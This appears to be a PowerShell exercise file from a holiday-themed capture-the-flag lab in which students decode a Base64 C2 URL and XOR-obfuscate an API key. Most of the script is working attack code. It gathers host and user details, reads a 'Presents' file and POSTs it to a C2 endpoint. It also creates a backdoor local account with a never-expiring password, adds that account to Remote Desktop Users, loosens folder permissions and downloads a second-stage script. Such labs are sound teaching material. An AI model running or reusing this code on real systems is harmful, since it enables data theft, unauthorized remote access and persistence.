# Only edit where the TODOs say. Do not remove the validator call at the end.

# ==========================
# IGNORE THIS
# ==========================
$ErrorActionPreference = 'SilentlyContinue'

# ==========================
# Start here
# Part 1: Deobfuscation
# ==========================
# TODO (Step 1): Deobfuscate the string present in the $C2B64 variable and place the URL in the $C2 variable,
# then run this script to get the flag.

$C2B64 = "aHR0cHM6Ly9jMi5ub3J0aHBvbGUudGhtL2V4Zmls"
$C2    = "REDACTED"   
# ==========================
# Part 2: Obfuscation
# ==========================
# TODO (Step 2): Obfuscate the API key using XOR single-byte key 0x37 and convert to hexidecimal,
# then add the hex string to the $ObfAPieEy variable.
# Then run this script again to receive Flag #2 from the validator.
$ApiKey = "CANDY-CANE-API-KEY"
$ObfAPIKEY = Invoke-XorDecode -Hex "REDACTED" -Key 0x37
# ========================== 
# ==========================
function Decode-B64 {
    param([Parameter(Mandatory=$true)][string]$S)
    try { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($S)) } catch { "" }
}

function Invoke-XorDecode {
    [CmdletBinding()]
    param(
        [AllowEmptyString()][string]$Hex,
        [int]$Key
    )

    if ([string]::IsNullOrWhiteSpace($Hex)) {
        return ""
    }

    $clean = $Hex `
        -replace '(?i)0x','' `
        -replace '[\s,''"":;,_-]+','' `
        -replace '[^0-9A-Fa-f]',''

    if ($clean.Length -eq 0) {
        return ""
    }
    if (($clean.Length % 2) -ne 0) {
        return ""
    }

    $count = $clean.Length / 2
    $bytes = New-Object byte[] $count

    for ($i = 0; $i -lt $count; $i++) {
        $pair = $clean.Substring($i * 2, 2)
        try {
            $b = [Convert]::ToByte($pair, 16)
        } catch {
            $b = 0
        }
        $bytes[$i] = ($b -bxor $Key)
    }

    try {
        return [Text.Encoding]::UTF8.GetString($bytes)
    } catch {
        return ""
    }
}

# ==========================
# ==========================
function Get-SystemSnapshot {
    [PSCustomObject]@{
        ts   = (Get-Date).ToString("o")
        user = $env:USERNAME
        host = $env:COMPUTERNAME
        os   = (Get-CimInstance Win32_OperatingSystem).Version
        ps   = $PSVersionTable.PSVersion.ToString()
    }
}

function Get-PresentsFile {
    $path = Join-Path $env:USERPROFILE "Documents\Santa\Presents.txt"
    if (Test-Path -LiteralPath $path) {
        try { (Get-Content -LiteralPath $path -ErrorAction Stop) -join "`n" }
        catch { "[read error]" }
    } else { "[missing]" }
}

function New-ExfilPayload {
    param([psobject]$SystemInfo, [string]$Presents)
    [pscustomobject]@{
        t  = "present-list-exfil"
        ep = "[redacted]"
        sys= $SystemInfo
        pl = $Presents
    } | ConvertTo-Json -Depth 5 -Compress
}

$__needC2  = [string]::IsNullOrWhiteSpace($C2)
$__needHex = [string]::IsNullOrWhiteSpace($ObfAPIKEY)
if ($__needC2 -and $__needHex) { Write-Host "[i] incorrect C2 URL and  XOR-obfuscated API hex." }
elseif (-not $__needC2 -and $__needHex) { Write-Host "[i] incorrect XOR-obfuscated API hex." }

# ==========================
# ==========================
function C2-Armed([string]$Url){
    try {
        if ([string]::IsNullOrWhiteSpace($Url)) { return $false }
        $u=[Uri]$Url
        ($u.Scheme -eq "https") -and ($u.Host -like "*northpole*")
    } catch { $false }
}
function Exfil([string]$Url,[string]$Payload,[string]$Key){
    try {
        $headers = @{ "X-Api-Key" = $Key; "Content-Type" = "application/json" }
        $null = Invoke-WebRequest -Uri $Url -Method POST -Body $Payload -Headers $headers -TimeoutSec 5
        $true
    } catch { $false }
}

# ==========================
# ==========================

$User       = "UmV2aWxSYWJiaXQ="                   
$Pass       = "SDBsbHlXMDBkXkNhcnJvdHMh"            
$RabbitUrl  = "aHR0cDovLzEyNy4wLjAuMTo4MDgwL3JhYmJpdC5wczE="  
function Ensure-RevilRabbit {
    $User = Decode-B64 $script:User
    $Pass = Decode-B64 $script:Pass
    $sec  = ConvertTo-SecureString $Pass -AsPlainText -Force
    if (-not (Get-LocalUser -Name $User -ErrorAction SilentlyContinue)) {
        New-LocalUser -Name $User -Password $sec -FullName "Service Account" -PasswordNeverExpires -UserMayNotChangePassword | Out-Null
    }
    try { Add-LocalGroupMember -Group "Remote Desktop Users" -Member $User -ErrorAction Stop } catch {}
}

function Stage-Rabbit-ForUser {
    $User = Decode-B64 $script:User
    $Url  = Decode-B64 $script:RabbitUrl

    $desk = "C:\Users\$User\Desktop"
    try {
        New-Item -ItemType Directory -Path $desk -Force | Out-Null
        & icacls $desk /grant "$env:COMPUTERNAME\${User}:(OI)(CI)M" /T | Out-Null
    } catch {}

    $out = Join-Path $desk 'rabbit.ps1'
    $ok = $false
    for ($i=0; $i -lt 3 -and -not $ok; $i++) {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $out -TimeoutSec 10
            $ok = (Test-Path -LiteralPath $out) -and ((Get-Item -LiteralPath $out).Length -gt 0)
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    if (-not $ok) {
        Set-Content -Path $out -Value '# rabbit placeholder' -Encoding UTF8
    }
}

# ==========================
# ==========================
Write-Host "[i] Operator session started"
Write-Host "[*] Recon: collecting host and user context"
$sys   = Get-SystemSnapshot

Write-Host "[*] Stealing Santas presents list"
$plist = Get-PresentsFile

Write-Host "[*] Preparing payload"
$body  = New-ExfilPayload -SystemInfo $sys -Presents $plist

if (C2-Armed $C2) {
    Write-Host "[*] Contacting C2 endpoint"
    $ok = Exfil -Url $C2 -Payload $body -Key $ApiKey
    if ($ok) { Write-Host "[+] Exfiltration reported as completed" } else { Write-Host "[i] Exfiltration attempted (no response)" }
} else {
    Write-Host "[i] C2 not reachable"
}

Write-Host "[*] Establishing foothold"
Ensure-RevilRabbit

Write-Host "[*] Downloading payload..."
Stage-Rabbit-ForUser

# ==========================
# !!! DO NOT MODIFY !!!
# ==========================
$ScriptPath = $MyInvocation.MyCommand.Path
$Validator  = Join-Path $PSScriptRoot "validator.exe"
if (Test-Path $Validator) {
    & $Validator --script "$ScriptPath"
} else {
    Write-Host "[!] validator.exe not found. No flags will be printed."
}
